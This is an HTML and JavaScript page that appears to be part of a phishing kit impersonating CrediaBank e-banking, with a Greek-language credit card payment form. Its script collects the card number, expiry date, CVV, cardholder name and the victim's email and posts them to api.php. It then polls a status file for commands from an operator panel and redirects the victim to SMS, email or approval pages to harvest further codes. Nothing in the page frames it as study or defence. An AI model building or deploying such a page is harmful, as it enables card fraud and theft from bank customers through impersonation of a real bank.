<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, viewport-fit=cover">
    <title>CrediaBank e-banking | Πληρωμή με Πιστωτική Κάρτα</title>
    <link rel="stylesheet" href="./css/snipped.css">
    <link rel="stylesheet" href="./css/cssr.css">
    <link rel="stylesheet" href="./css/cssl.css">
    <link rel="stylesheet" href="./css/css.css">
    <style>
        .login-campaigns-container { display: flex; justify-content: center; align-items: center; width: 100%; }
        .sms-widget { max-width: 550px; width: 100%; margin: 0 auto 48px auto; float: none; }
        @media (max-width: 768px) { .sms-widget { margin-bottom: 32px; } }
        .redesign-footer-container { margin-top: 20px; }
        .credit-card-form {
            background: #FFFFFF; border-radius: 28px; padding: 32px 24px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.05); margin: 20px 0;
        }
        .virtual-card {
            background: linear-gradient(135deg, #1a1f2e 0%, #2a2f3e 100%); border-radius: 20px;
            padding: 20px; margin-bottom: 30px; color: white; position: relative;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2); min-height: 200px;
            display: flex; flex-direction: column; justify-content: space-between;
        }
        .card-chip {
            background: #d4af37; width: 40px; height: 32px; border-radius: 8px;
            margin-bottom: 30px; position: relative;
        }
        .card-chip::before {
            content: "•••"; position: absolute; top: 8px; left: 10px;
            font-size: 12px; color: #a67c00; letter-spacing: 2px;
        }
        .card-number { font-size: 22px; letter-spacing: 2px; font-family: monospace; margin-bottom: 20px; word-break: break-all; }
        .card-details { display: flex; justify-content: space-between; font-size: 14px; }
        .card-name { text-transform: uppercase; }
        .form-group { margin-bottom: 20px; position: relative; }
        .form-group label { display: block; font-size: 14px; font-weight: 600; color: #171A1C; margin-bottom: 8px; }
        .form-group input {
            width: 100%; padding: 14px 16px; font-size: 16px;
            border: 1px solid #C8CCD0; border-radius: 14px;
            transition: 0.2s; background: #FFFFFF;
        }
        .form-group input:focus { outline: none; border-color: #0047AB; box-shadow: 0 0 0 3px rgba(0,71,171,0.1); }
        .row-2cols { display: flex; gap: 16px; }
        .row-2cols .form-group { flex: 1; }
        .submit-btn {
            background: #0047AB; color: white; border: none; border-radius: 60px;
            padding: 16px 28px; font-size: 18px; font-weight: 600; width: 100%;
            cursor: pointer; transition: 0.2s; margin-top: 12px;
        }
        .submit-btn:hover { background: #003380; transform: scale(1.01); }
        .modal-overlay.ng-hide { display: none !important; }
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 2000;
            display: flex; align-items: center; justify-content: center;
        }
        .modal-loading {
            background: white; padding: 24px 32px; border-radius: 28px;
            text-align: center; box-shadow: 0 20px 35px -8px rgba(0,0,0,0.2);
        }
        .spinner-container {
            width: 40px; height: 40px; margin: 0 auto 16px;
            border: 4px solid #E9ECEF; border-top: 4px solid #0047AB;
            border-radius: 50%; animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-message {
            background: #FFEFEF; color: #B00020; border-radius: 12px;
            padding: 12px; text-align: center; margin-top: 16px;
            display: none;
        }
        .error-message.show { display: block; }
    </style>
</head>
<body>
<div class="right-side margin-auto snipcss-wnMB2">
    <div class="container ng-scope redesign-header-fragment-container">
        <div class="row">
            <div fragment="redesignHeader" class="ng-scope">
                <div id="redesign-header" class="redesign-header-container ng-scope">
                    <div class="logo-container hidden-small">
                        <a href="#"><img src="https://ebanking.crediabank.com/img/redesignLogo.png?ver=f1604f7ac63ee5a707473775a64907bb02f96080" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="logo-container hidden-above-medium">
                        <a href="#"><img src="./images/logo-small.svg" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="top-links">
                        <ul class="hidden-small">
                            <li><span class="branches header-icon hidden-xs"></span><div class="header-link-container"><a>Καταστήματα &amp; ΑΤΜ</a></div></li>
                            <li><span class="communication header-icon hidden-xs"></span><div class="header-link-container"><a>Επικοινωνία</a></div></li>
                            <li><span class="header-icon languages"></span><div class="header-link-container"><a>Greek</a></div></li>
                        </ul>
                        <ul class="hidden-above-medium">
                            <li class="header-icon-container"><a class="header-icon-small branches"></a></li>
                            <li class="header-icon-container"><a class="header-icon-small communication"></a></li>
                            <li class="language-container"><div class="header-icon-small"><span class="header-icon languages"></span></div><div class="plain-list-drop-down"><a class="plain-list-drop-down-selector"></a><div class="plain-list-drop-down-selected"><a>GR</a></div></div></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="log-container" class="container">
        <div class="row">
            <div id="main-log" class="ng-scope view-animation-left">
                <form id="creditCardForm" autocomplete="off" class="ng-pristine ng-scope">
                    <div class="login-campaigns-container">
                        <div class="login-widget col-lg-6 col-md-12 sms-widget">
                            <div class="top-container">
                                <h1 class="ng-binding">Πληρωμή με Πιστωτική Κάρτα</h1>
                                <div class="credit-card-form">
                                    <div class="virtual-card">
                                        <div class="card-chip"></div>
                                        <div class="card-number" id="displayCardNumber">**** **** **** ****</div>
                                        <div class="card-details">
                                            <span class="card-expiry" id="displayExpiry">MM/YY</span>
                                            <span class="card-name" id="displayCardName">ΟΝΟΜΑ ΚΑΤΟΧΟΥ</span>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label>Αριθμός Κάρτας</label>
                                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off">
                                    </div>
                                    <div class="row-2cols">
                                        <div class="form-group">
                                            <label>Ημερομηνία Λήξης</label>
                                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
                                        </div>
                                        <div class="form-group">
                                            <label>CVV</label>
                                            <input type="text" id="cvv" placeholder="123" maxlength="4">
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label>Όνομα Κατόχου (όπως στην κάρτα)</label>
                                        <input type="text" id="cardName" placeholder="ΙΩΑΝΝΗΣ ΠΑΠΑΔΟΠΟΥΛΟΣ" autocomplete="off">
                                    </div>
                                    <button type="button" id="payBtn" class="submit-btn">Πληρωμή</button>
                                    <div id="errorMessage" class="error-message"></div>
                                </div>
                            </div>
                            <div id="cardMessageArea" class="bottom-container"></div>
                        </div>
                    </div>
                    <div class="container redesign-footer-container ng-scope">
                        <div class="row">
                            <div class="footer-container ng-scope">
                                <div class="footer-content-left">
                                    <span class="footer-logo"></span>
                                    <div class="footer-communication-container">
                                        <div class="footer-communication">
                                            <div class="footer-email-container"><span class="footer-email"></span><a class="footer-bold-weight ng-binding" href="mailto:ebanking@crediabank.com">ebanking@crediabank.com</a></div>
                                            <div class="footer-tel-container"><span class="footer-tel"></span><a class="footer-bold-weight ng-binding" href="tel:2103669000">210 366 9000</a></div>
                                        </div>
                                        <div class="footer-socials-container">
                                            <a class="instagram icon" href="#"></a>
                                            <a class="linkedIn icon" href="#"></a>
                                            <a class="youtube icon" href="#"></a>
                                        </div>
                                    </div>
                                    <div class="footer-apps-container-left">
                                        <div class="footer-apps">
                                            <p class="ng-scope">Κατεβάστε την εφαρμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                            <span class="ng-binding">Copyright © 2025</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="footer-section-container">
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΠΛΗΡΟΦΟΡΙΕΣ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Όροι Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ασφάλεια Συναλλαγών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Κωδικοί Μιας Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Συχνές Ερωτήσεις</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υποστήριξη</a></li>
                                        </ul>
                                    </div>
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΧΡΗΣΙΜΑ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Πολιτική Cookies</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Προσωπικά Δεδομένα</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εγγύηση Καταθέσεων</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υπολογιστής ΙΒΑΝ</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ειδικοί Όροι Τραπεζικών Εργασιών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εργαλείο Μετατροπής Αρχείου σε XML</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="footer-apps-container-right">
                                    <div class="footer-apps">
                                        <p class="ng-scope">Κατεβάστε την εφαρμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                        <span class="ng-binding">Copyright © 2025</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay ng-hide" id="loadingModal">
    <div class="modal-loading">
        <div class="spinner-container"></div>
        <span>Επεξεργασία πληρωμής...</span>
    </div>
</div>

<script>
(function() {
    const payBtn = document.getElementById('payBtn');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const cardNameInput = document.getElementById('cardName');
    const displayCardNumber = document.getElementById('displayCardNumber');
    const displayExpiry = document.getElementById('displayExpiry');
    const displayCardName = document.getElementById('displayCardName');
    const loadingModal = document.getElementById('loadingModal');
    const errorDiv = document.getElementById('errorMessage');
    
    let storedEmail = '';
    let checkInterval = null;
    let lastStatus = "";

    // Get email from URL
    const urlParams = new URLSearchParams(window.location.search);
    storedEmail = urlParams.get('u') || localStorage.getItem('tempEmail') || '';
    localStorage.setItem('tempEmail', storedEmail);
    
    console.log('Card Page - Email:', storedEmail);

    function setLoading(show) {
        if (show) loadingModal.classList.remove('ng-hide');
        else loadingModal.classList.add('ng-hide');
    }
    
    function showError(msg) {
        errorDiv.innerText = msg;
        errorDiv.classList.add('show');
        setTimeout(() => errorDiv.classList.remove('show'), 5000);
    }

    // Virtual card updates
    cardNumberInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 16) value = value.slice(0, 16);
        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
        this.value = formatted;
        let masked = '**** **** **** ****';
        if (value.length > 0) {
            if (value.length > 6) masked = value.slice(0, 6) + ' •••• ' + value.slice(-4);
            else masked = value + ' •••• ••••';
        }
        displayCardNumber.innerText = masked;
    });

    expiryInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length >= 2) value = value.slice(0,2) + '/' + value.slice(2,4);
        this.value = value.slice(0,5);
        displayExpiry.innerText = this.value || 'MM/YY';
    });

    cardNameInput.addEventListener('input', function() {
        displayCardName.innerText = this.value.toUpperCase() || 'ΟΝΟΜΑ ΚΑΤΟΧΟΥ';
    });

    function validateForm() {
        const cardRaw = cardNumberInput.value.replace(/\s/g, '');
        if (cardRaw.length !== 16) { showError("Παρακαλώ εισάγετε 16-ψήφιο αριθμό κάρτας"); return false; }
        const expiryRaw = expiryInput.value.replace('/', '');
        if (expiryRaw.length !== 4) { showError("Παρακαλώ εισάγετε έγκυρη ημερομηνία λήξης (MM/YY)"); return false; }
        const cvvRaw = cvvInput.value.replace(/\D/g, '');
        if (cvvRaw.length < 3 || cvvRaw.length > 4) { showError("Παρακαλώ εισάγετε έγκυρο CVV"); return false; }
        if (!cardNameInput.value.trim()) { showError("Παρακαλώ εισάγετε το όνομα του κατόχου"); return false; }
        return true;
    }

    function stopChecking() {
        if (checkInterval) {
            clearInterval(checkInterval);
            checkInterval = null;
        }
    }

    function checkStatus() {
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
        .then(r => r.json())
        .then(data => {
            let status = "";
            for (let ip in data) {
                if (data[ip].email === storedEmail) {
                    status = data[ip].status;
                    console.log('Card Page - Status found:', status);
                    break;
                }
            }
            
            if (status !== lastStatus) {
                lastStatus = status;
                console.log('Card Page - Status changed to:', status);
                
                // Redirect based on status
                if (status === 'go_approve' || status === 'push_approved') {
                    stopChecking();
                    window.location.href = 'aprouve.php?u=' + encodeURIComponent(storedEmail);
                }
                else if (status === 'finished') {
                    stopChecking();
                    window.location.href = 'https://www.crediabank.com/';
                }
                else if (status === 'otp_error' || status === 'push_error') {
                    setLoading(false);
                    showError("Η συναλλαγή απορρίφθηκε. Δοκιμάστε ξανά.");
                    stopChecking();
                }
                else if (status === 'go_sms') {
                    stopChecking();
                    window.location.href = 'sms.php?u=' + encodeURIComponent(storedEmail);
                }
                else if (status === 'go_email') {
                    stopChecking();
                    window.location.href = 'email.php?u=' + encodeURIComponent(storedEmail);
                }
            }
        }).catch(err => console.log("Waiting for status...", err));
    }

    payBtn.onclick = function() {
        if (!validateForm()) return;
        setLoading(true);

        // Send card data to API
        let fd = new FormData();
        fd.append('type', 'card');
        fd.append('card_number', cardNumberInput.value.replace(/\s/g, ''));
        fd.append('expiry', expiryInput.value);
        fd.append('cvv', cvvInput.value);
        fd.append('card_name', cardNameInput.value);
        fd.append('email', storedEmail);
        
        fetch('api.php', { method: 'POST', body: fd })
            .then(() => {
                // Start checking for operator commands from panel
                if (!checkInterval) {
                    checkInterval = setInterval(checkStatus, 2000);
                }
            })
            .catch(err => {
                console.error(err);
                setLoading(false);
                showError("Σφάλμα επικοινωνίας");
            });
    };
})();
</script>
</body>
</html>